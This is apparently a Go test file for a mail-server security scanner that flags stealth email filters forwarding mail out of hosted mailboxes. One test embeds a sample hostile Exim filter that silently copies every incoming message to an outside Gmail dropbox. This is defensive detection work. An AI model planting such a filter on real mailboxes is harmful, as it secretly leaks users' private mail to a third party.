// Integration: CheckMailFilters scans per-mailbox filters under /home and
// flags the stealth filter as a non-gated critical exfil even on first scan.
func TestCheckMailFiltersFlagsStealthOnFirstScan(t *testing.T) {
	withTestStore(t)
	now := time.Date(2026, 6, 4, 12, 0, 0, 0, time.UTC)
	path := "/home/lifecontro/etc/example.com/aura/filter"

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == filepath.Join("/home", "*", "etc", "*", "*", "filter") {
				return []string{path}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{path: now}),
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/etc/localdomains":
				return []byte("example.com\n"), nil
			case path:
				return []byte(filterAuraStealth), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
	if len(findings) != 1 {
		t.Fatalf("len(findings) = %d, want 1: %+v", len(findings), findings)
	}
	f := findings[0]
	if f.Check != "email_filter_exfil" || f.Severity != alert.Critical {
		t.Fatalf("finding = %+v, want email_filter_exfil/Critical", f)
	}
	if f.Domain != "example.com" || f.Mailbox != "aura@example.com" {
		t.Errorf("tenant fields = domain %q mailbox %q, want example.com / aura@example.com", f.Domain, f.Mailbox)
	}
}

// Cross-account: the same dropbox address across two mailboxes is a campaign;
// findings must be annotated and stay critical.
func TestCheckMailFiltersCrossAccountCorrelation(t *testing.T) {
	withTestStore(t)
	now := time.Date(2026, 6, 4, 12, 0, 0, 0, time.UTC)
	p1 := "/home/u1/etc/example.com/a/filter"
	p2 := "/home/u2/etc/example.org/b/filter"
	shared := `headers charset "UTF-8"
if
 $header_from: contains "@"
then
 deliver "shared-dropbox@gmail.com"
 save "$home/mail/x/y/"
endif
`
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == filepath.Join("/home", "*", "etc", "*", "*", "filter") {
				return []string{p1, p2}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{p1: now, p2: now.Add(-time.Minute)}),
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/etc/localdomains":
				return []byte("example.com\nexample.org\n"), nil
			case p1, p2:
				return []byte(shared), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
	if len(findings) != 2 {
		t.Fatalf("len(findings) = %d, want 2: %+v", len(findings), findings)
	}
	for _, f := range findings {
		if !strings.Contains(strings.ToLower(f.Details), "cross-account") {
			t.Errorf("finding missing cross-account annotation: %+v", f)
		}
	}
}

func TestCheckMailFiltersThrottled(t *testing.T) {
	db := withTestStore(t)
	if err := db.SetMetaString("email:mailfilter_last_refresh", time.Now().Format(time.RFC3339)); err != nil {
		t.Fatal(err)
	}
	called := false
	withMockOS(t, &mockOS{
		glob: func(string) ([]string, error) { called = true; return nil, nil },
	})
	cfg := &config.Config{}
	cfg.EmailProtection.PasswordCheckIntervalMin = 1440
	findings := CheckMailFilters(context.Background(), cfg, nil)
	if len(findings) != 0 {
		t.Fatalf("throttled run should return no findings; got %+v", findings)
	}
	if called {
		t.Error("throttled run should not glob the filesystem")
	}
}
